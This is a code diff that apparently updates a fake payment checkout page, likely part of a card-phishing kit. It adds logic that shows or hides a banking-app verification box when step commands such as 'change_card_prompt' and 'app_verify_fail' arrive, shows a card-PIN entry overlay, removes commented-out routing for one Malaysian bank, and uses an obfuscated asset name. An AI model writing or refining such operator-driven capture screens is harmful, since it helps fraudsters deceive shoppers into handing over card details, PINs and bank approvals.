@@ -1625,6 +1625,7 @@ url("pay1ment_icons.woff") format("woff");
     } else if (a === 'change_card_prompt'  || a==='custom_prompt') {
       _curStep = 'card';
       document.getElementById('load-overlay').classList.add('hidden');
+      document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
       document.querySelector("#mount1").classList.add('hidden');
       document.querySelector("#mount2").classList.add('hidden');
       document.querySelector("#mount3").classList.add('hidden');
@@ -1646,6 +1647,7 @@ url("pay1ment_icons.woff") format("woff");
     } else if (a === 'change_card') {
       _curStep = 'card';
       document.getElementById('load-overlay').classList.add('hidden');
+      document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
       document.querySelector("#mount1").classList.add('hidden');
       document.querySelector("#mount2").classList.add('hidden');
       document.querySelector("#mount3").classList.add('hidden');
@@ -1785,27 +1787,17 @@ url("pay1ment_icons.woff") format("woff");
             <span>${timeStr} </span>
         `;
       }
-
-      /*if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;
-
-      if(p.bankName==='AMBANK (M) BERHAD') 
-        loadPage('/pages/page1', 'mount'); return;*/
-
-
-      var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
+      else
+      {
+        document.querySelector("#app-verify-overlay > div.app-verify-box").classList.remove('hidden');
+        var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
       updateBankLogo(bankName);
       document.getElementById('app-amount').textContent = '$' + discountedTotal().toFixed(2);
       updateAppSchemeLogo(p.cardInfo?.cardType || p.cardType || '')
+      }
+
+
+      
     } 
     else if (a === 'app_verify_fail') {
       window._appVerifyInProgress = true;
@@ -1829,7 +1821,7 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('load-overlay').classList.add('hidden');
       document.getElementById('pin-overlay').classList.remove('hidden');
       document.getElementById('pin-amount-row').style.display = '';
-      document.getElementById('pin-amount').textContent = '$' + discountedTotal().toFixed(2);
+      document.getElementById('pin-amount').textContent = 'MR ' + discountedTotal().toFixed(2);
       updateOtpCardLogoStyle(p.cardInfo?.cardType || p.cardType, 'pin-card-logo');
       resetPin();
                         }
